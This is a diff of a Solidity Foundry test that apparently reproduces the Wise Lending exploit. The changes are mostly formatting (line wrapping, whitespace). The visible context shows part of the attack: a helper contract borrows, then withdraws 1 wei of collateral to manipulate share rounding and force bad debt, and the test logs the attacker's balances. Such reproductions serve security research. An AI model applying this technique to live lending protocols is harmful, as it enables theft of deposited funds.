@@ -29,22 +29,27 @@ interface IWiseLending {
 
     function getPositionLendingShares(uint256 _nftId, address _poolToken) external view returns (uint256);
 
-    function getTotalPool(address _poolToken) external view returns (uint256);
+    function getTotalPool(
+        address _poolToken
+    ) external view returns (uint256);
 
     function mintPosition() external returns (uint256);
 
-    function lendingPoolData(address _poolToken)
-        external
-        view
-        returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);
+    function lendingPoolData(
+        address _poolToken
+    ) external view returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);
 
     function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
 }
 
 interface IPool is IERC20 {
-    function depositExactAmount(uint256 _underlyingLpAssetAmount) external returns (uint256, uint256);
+    function depositExactAmount(
+        uint256 _underlyingLpAssetAmount
+    ) external returns (uint256, uint256);
 
-    function withdrawExactShares(uint256 _shares) external returns (uint256);
+    function withdrawExactShares(
+        uint256 _shares
+    ) external returns (uint256);
 
     function getPositionLendingShares(uint256, address) external returns (uint256);
 }
@@ -152,7 +157,9 @@ contract WiseLending is Test {
 
         LPTPoolToken.withdrawExactShares(LPTPoolToken.balanceOf(address(this)));
 
-        emit log_named_decimal_uint("\n Attacker PendleLPT Balance After exploit", PendleLPT.balanceOf(address(this)), 18);
+        emit log_named_decimal_uint(
+            "\n Attacker PendleLPT Balance After exploit", PendleLPT.balanceOf(address(this)), 18
+        );
 
         emit log_named_decimal_uint("Attacker WETH Balance After exploit", WETH.balanceOf(address(this)), 18);
 
@@ -175,7 +182,7 @@ contract Helper {
         wiseLending.borrowExactAmount(positionId, address(asset), debtAmount); // borrow asset
 
         // withdraw 1 wei collateral, burn 1 share, donate (sharePrice - 1) wei collateral to the pool, forced position entered into bad debt
-        wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1); 
+        wiseLending.withdrawExactAmount(positionId, address(LPTPoolToken), 1);
 
         asset.transfer(msg.sender, asset.balanceOf(address(this)));
         LPTPoolToken.transfer(msg.sender, LPTPoolToken.balanceOf(address(this)));
